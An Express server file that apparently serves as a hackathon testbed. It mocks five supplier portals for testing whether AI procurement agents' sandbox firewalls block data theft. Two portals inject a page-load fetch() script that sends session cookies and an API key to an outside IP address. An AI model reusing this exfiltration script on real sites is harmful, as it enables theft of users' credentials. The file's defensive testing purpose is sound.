/**
 * Mock Supplier Portals for AI Agent Hackathon Demo
 * --------------------------------------------------
 * Simulates 5 supplier portals:
 *  - Portals 1, 2, 3: Safe portals (Login -> Dashboard -> Download Invoice)
 *  - Portals 4, 5: Compromised portals (Visually identical, but triggers client-side
 *                  fetch() exfiltration to 185.23.50.50:80 to test iptables drop rules)
 *
 * Zero external CSS/JS dependencies. Pure Express single-file server.
 */

const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware for parsing form submissions and JSON
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 5 Supplier Configurations
const PORTALS = {
  portal1: { id: 'portal1', name: 'Apex Industrial Components', safe: true, code: 'AIC-01' },
  portal2: { id: 'portal2', name: 'Nexus Precision Logistics', safe: true, code: 'NPL-02' },
  portal3: { id: 'portal3', name: 'Vanguard Raw Materials Co.', safe: true, code: 'VRM-03' },
  portal4: { id: 'portal4', name: 'Titan Semiconductor Dist.', safe: false, code: 'TSD-04' },
  portal5: { id: 'portal5', name: 'Zenith Global Avionics', safe: false, code: 'ZGA-05' }
};

// Brutalist Shared Stylesheet (Inline, zero external calls)
const BASE_CSS = `
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
    background: #0e0f12;
    color: #e4e7eb;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 24px;
  }
  .card {
    background: #181a20;
    border: 2px solid #2d3139;
    box-shadow: 6px 6px 0px #000;
    width: 100%;
    max-width: 520px;
    padding: 32px;
  }
  .header {
    border-bottom: 2px solid #2d3139;
    padding-bottom: 16px;
    margin-bottom: 24px;
  }
  .header h1 {
    font-size: 1.15rem;
    font-weight: 700;
    letter-spacing: -0.02em;
    color: #fff;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  .badge {
    font-size: 0.72rem;
    padding: 3px 8px;
    background: #252932;
    border: 1px solid #3e4451;
    color: #9aa5b5;
    text-transform: uppercase;
  }
  .form-group {
    margin-bottom: 18px;
  }
  label {
    display: block;
    font-size: 0.8rem;
    color: #9aa5b5;
    margin-bottom: 6px;
    text-transform: uppercase;
    font-weight: 600;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 10px 14px;
    background: #0e0f12;
    border: 1px solid #3e4451;
    color: #fff;
    font-family: inherit;
    font-size: 0.95rem;
    outline: none;
  }
  input[type="text"]:focus, input[type="password"]:focus {
    border-color: #5b68df;
  }
  .btn {
    display: inline-block;
    width: 100%;
    padding: 12px;
    background: #e4e7eb;
    color: #0e0f12;
    border: 2px solid #fff;
    font-family: inherit;
    font-size: 0.9rem;
    font-weight: 700;
    text-align: center;
    text-decoration: none;
    text-transform: uppercase;
    cursor: pointer;
    box-shadow: 4px 4px 0px #000;
    transition: transform 0.05s ease;
  }
  .btn:hover {
    background: #fff;
  }
  .btn:active {
    transform: translate(2px, 2px);
    box-shadow: 2px 2px 0px #000;
  }
  .btn-accent {
    background: #3b82f6;
    color: #fff;
    border-color: #60a5fa;
  }
  .btn-accent:hover {
    background: #2563eb;
  }
  .meta-row {
    display: flex;
    justify-content: space-between;
    padding: 8px 0;
    border-bottom: 1px dashed #2d3139;
    font-size: 0.82rem;
  }
  .meta-key { color: #9aa5b5; }
  .meta-val { color: #fff; font-weight: 600; }
  .note {
    margin-top: 20px;
    font-size: 0.72rem;
    color: #6c7689;
    line-height: 1.4;
  }
`;

// Helper: Generate Login Page HTML
function renderLoginPage(portal) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>${portal.name} - Vendor Authentication</title>
  <style>${BASE_CSS}</style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>
        <span>${portal.name}</span>
        <span class="badge">${portal.code}</span>
      </h1>
    </div>
    <form action="/${portal.id}/login" method="POST">
      <div class="form-group">
        <label for="username">Authorized Agent ID / Username</label>
        <input type="text" id="username" name="username" placeholder="agent-playwright-worker" required autocomplete="username">
      </div>
      <div class="form-group">
        <label for="password">Session Access Key / Password</label>
        <input type="password" id="password" name="password" placeholder="••••••••••••" required autocomplete="current-password">
      </div>
      <button type="submit" class="btn">Authenticate & Access Dashboard</button>
    </form>
    <div class="note">
      SECURE PROTOCOL • ACCEPTING ANY DEMO CREDENTIALS • DISPOSABLE PLAYWRIGHT TESTBED
    </div>
  </div>
</body>
</html>`;
}

// Helper: Generate Dashboard Page HTML
function renderDashboardPage(portal) {
  // If malicious, inject client-side exfiltration script targeted at external mock attacker IP
  const maliciousScript = portal.safe ? '' : `
  <script>
    (function() {
      // -----------------------------------------------------------------------
      // MALICIOUS SIMULATED PAYLOAD (Portal 4 / 5)
      // Executes immediately on page load to exfiltrate cookies/DOM secrets.
      // Expected Behavior in Zero-Trust Sandbox:
      // Docker iptables egress firewall MUST DROP this packet before it leaves host.
      // -----------------------------------------------------------------------
      const exfilEndpoint = "http://185.23.50.50:80/exfiltrate";
      const stolenData = {
        originPortal: "${portal.id}",
        supplierName: "${portal.name}",
        cookies: document.cookie,
        accountSecret: document.getElementById('vault-key')?.innerText || "SK_PROD_SUPPLIER_09918",
        url: window.location.href,
        timestamp: new Date().toISOString()
      };

      try {
        fetch(exfilEndpoint, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(stolenData)
        }).then(function() {
          console.warn("[SECURITY_TEST] Exfiltration request sent to " + exfilEndpoint);
        }).catch(function(err) {
          console.info("[ZERO_TRUST_DEFENSE] Exfiltration connection blocked:", err.message);
        });
      } catch (e) {
        console.info("[ZERO_TRUST_DEFENSE] Trapped fetch error:", e);
      }
    })();
  </script>`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>${portal.name} - Vendor Dashboard</title>
  <style>${BASE_CSS}</style>
</head>
<body>
  <div class="card">
    <div class="header">
      <h1>
        <span>${portal.name}</span>
        <span class="badge">${portal.code}</span>
      </h1>
    </div>

    <div style="margin-bottom: 24px;">
      <div class="meta-row">
        <span class="meta-key">SUPPLIER STATUS</span>
        <span class="meta-val" style="color: #4ade80;">ACTIVE • VERIFIED</span>
      </div>
      <div class="meta-row">
        <span class="meta-key">BILLING CYCLE</span>
        <span class="meta-val">OCTOBER 2026 (FINAL)</span>
      </div>
      <div class="meta-row">
        <span class="meta-key">OUTSTANDING AMOUNT</span>
        <span class="meta-val">$18,450.00 USD</span>
      </div>
      <div class="meta-row">
        <span class="meta-key">API VAULT KEY</span>
        <span class="meta-val" id="vault-key">SK_LIVE_${portal.code}_9948271</span>
      </div>
    </div>

    <div style="margin-bottom: 12px;">
      <a href="/${portal.id}/invoice" class="btn btn-accent" download>
        Download October Invoice
      </a>
    </div>

    <div>
      <a href="/${portal.id}/login" class="btn" style="background: transparent; color: #9aa5b5; border-color: #2d3139; font-size: 0.78rem; padding: 8px;">
        Disconnect Session
      </a>
    </div>

    <div class="note">
      INVOICE ARCHIVE GENERATED DETERMINISTICALLY • AUTOMATED RETRIEVAL ENDPOINT READY
    </div>
  </div>

  ${maliciousScript}
</body>
</html>`;
}

// Register routes dynamically for all 5 portals
Object.values(PORTALS).forEach(portal => {
  const pPath = `/${portal.id}`;

  // Default redirect to login
  app.get(pPath, (req, res) => {
    res.redirect(`${pPath}/login`);
  });

  // GET: Login Page
  app.get(`${pPath}/login`, (req, res) => {
    res.send(renderLoginPage(portal));
  });

  // POST: Login Submission (Accept any credentials)
  app.post(`${pPath}/login`, (req, res) => {
    const { username } = req.body;
    const sessionToken = `sess_${portal.id}_${Date.now()}_agent_${Buffer.from(username || 'anonymous').toString('hex').slice(0, 8)}`;
    
    // Set mock authentication cookies
    res.setHeader('Set-Cookie', [
      `session_token=${sessionToken}; Path=/; HttpOnly=false; SameSite=Lax`,
      `supplier_id=${portal.code}; Path=/; HttpOnly=false; SameSite=Lax`
    ]);

    res.redirect(`${pPath}/dashboard`);
  });

  // GET: Dashboard Page (Visually identical across all 5; 4 and 5 include hidden exfil payload)
  app.get(`${pPath}/dashboard`, (req, res) => {
    res.send(renderDashboardPage(portal));
  });

  // GET: Download October Invoice (Dummy plain text file)
  app.get(`${pPath}/invoice`, (req, res) => {
    const invoiceContent = [
      `============================================================`,
      `                  OFFICIAL SUPPLIER INVOICE                 `,
      `============================================================`,
      `Supplier:      ${portal.name} (${portal.code})`,
      `Invoice No:    INV-OCT2026-${portal.code}-0091`,
      `Issue Date:    2026-10-31`,
      `Due Date:      2026-11-15`,
      `Status:        PAYMENT PENDING`,
      `------------------------------------------------------------`,
      `ITEM DESCRIPTION                          QTY     AMOUNT    `,
      `------------------------------------------------------------`,
      `Industrial Hardware Component Kit - Rev4   100     $12,500.00`,
      `Expedited Secure Freight & Customs         1       $ 3,950.00`,
      `Quality Assurance & Compliance Cert        1       $ 2,000.00`,
      `------------------------------------------------------------`,
      `TOTAL DUE:                                         $18,450.00`,
      `Wire Routing:  US98 0001 2349 8812 0041`,
      `============================================================`,
      `Verified by Automated Procurement Sandbox`,
      ``
    ].join('\n');

    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="invoice_october_${portal.id}.txt"`);
    res.send(invoiceContent);
  });
});

// Root Index Page: Demonstration Command Center
app.get('/', (req, res) => {
  const portalLinks = Object.values(PORTALS).map(p => `
    <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 14px; background: #181a20; border: 1px solid #2d3139; margin-bottom: 10px;">
      <div>
        <div style="font-weight: 700; color: #fff;">${p.name}</div>
        <div style="font-size: 0.75rem; color: #6c7689;">Route: /${p.id}/login &nbsp;|&nbsp; Code: ${p.code}</div>
      </div>
      <div style="display: flex; gap: 8px; align-items: center;">
        <span style="font-size: 0.72rem; padding: 2px 6px; font-weight: 700; border: 1px solid ${p.safe ? '#22c55e' : '#ef4444'}; color: ${p.safe ? '#4ade80' : '#f87171'}; background: ${p.safe ? '#14532d20' : '#7f1d1d20'};">
          ${p.safe ? 'SAFE PORTAL' : 'MALICIOUS EXFILTRATION'}
        </span>
        <a href="/${p.id}/login" style="padding: 6px 10px; background: #e4e7eb; color: #0e0f12; font-size: 0.75rem; font-weight: 700; text-decoration: none;">Launch</a>
      </div>
    </div>
  `).join('');

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AI Agent Hackathon Testbed - Mock Supplier Portals</title>
  <style>${BASE_CSS}</style>
</head>
<body style="align-items: center;">
  <div class="card" style="max-width: 680px;">
    <div class="header">
      <h1>
        <span>Mock Supplier Portal Network</span>
        <span class="badge">DEMO CLUSTER</span>
      </h1>
      <p style="font-size: 0.8rem; color: #9aa5b5; margin-top: 6px;">
        Zero-Trust Defense Testbed for Headless Playwright AI Procurement Agents
      </p>
    </div>

    <div style="margin-bottom: 20px;">
      ${portalLinks}
    </div>

    <div style="background: #0e0f12; border: 1px solid #2d3139; padding: 14px; font-size: 0.75rem; line-height: 1.5; color: #9aa5b5;">
      <strong style="color: #fff;">Hackathon Intercept Architecture:</strong><br>
      • <span style="color: #4ade80;">Portals 1, 2, 3:</span> Benign supplier portals with standard invoice download.<br>
      • <span style="color: #f87171;">Portals 4, 5:</span> Visually identical portals injected with background JavaScript attempting to POST stolen session cookies to <code style="color: #e4e7eb;">http://185.23.50.50:80/exfiltrate</code>.<br>
      • <strong style="color: #fff;">Zero-Trust Confinement:</strong> Under our hardened Docker iptables egress rules, all requests to 185.23.50.50 are dropped silently while local MITM proxy forwarding permits legitimate operations.
    </div>
  </div>
</body>
</html>`);
});

// Start Express Server with Dual-Stack (IPv4 + IPv6 localhost), EADDRINUSE Resilience, and Auto-Launch
const { exec } = require('child_process');

function startServer(portToUse) {
  // Binding without '0.0.0.0' enables dual-stack IPv4/IPv6 so both localhost and 127.0.0.1 work seamlessly
  const srv = app.listen(portToUse, () => {
    printBanner(portToUse);
    // Automatically open user's default browser on desktop
    if (!process.env.NO_OPEN) {
      const openTarget = `http://localhost:${portToUse}/`;
      exec(`start "" "${openTarget}"`, (err) => {
        if (err) {
          // Fallback to 127.0.0.1 if localhost resolution throws
          exec(`start "" "http://127.0.0.1:${portToUse}/"`);
        }
      });
    }
  });

  srv.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
      const fallbackPort = Number(portToUse) + 1;
      console.warn(`[!] Port ${portToUse} is currently in use by another process.`);
      console.log(`[*] Automatically switching to fallback port: ${fallbackPort}...`);
      startServer(fallbackPort);
    } else {
      console.error('[!] Server encountered error:', err.message);
    }
  });

  return srv;
}

function printBanner(p) {
  console.log(`\n==================================================================`);
  console.log(`  🚀 Mock Supplier Portals are LIVE and RUNNING`);
  console.log(`  👉 Directory Hub:      http://localhost:${p}/`);
  console.log(`                         http://127.0.0.1:${p}/`);
  console.log(`==================================================================`);
  console.log(`  • Portal 1 (Safe):      http://localhost:${p}/portal1/login`);
  console.log(`  • Portal 2 (Safe):      http://localhost:${p}/portal2/login`);
  console.log(`  • Portal 3 (Safe):      http://localhost:${p}/portal3/login`);
  console.log(`  • Portal 4 (Malicious): http://localhost:${p}/portal4/login (Exfil to 185.23.50.50)`);
  console.log(`  • Portal 5 (Malicious): http://localhost:${p}/portal5/login (Exfil to 185.23.50.50)`);
  console.log(`------------------------------------------------------------------`);
  console.log(`  [i] Automatically opening ${httpUrl(p)} in your default browser...`);
  console.log(`  [i] Keep this terminal window OPEN while testing.`);
  console.log(`  [i] Press Ctrl + C to stop the server.`);
  console.log(`==================================================================\n`);
}

function httpUrl(p) {
  return `http://localhost:${p}/`;
}

startServer(PORT);
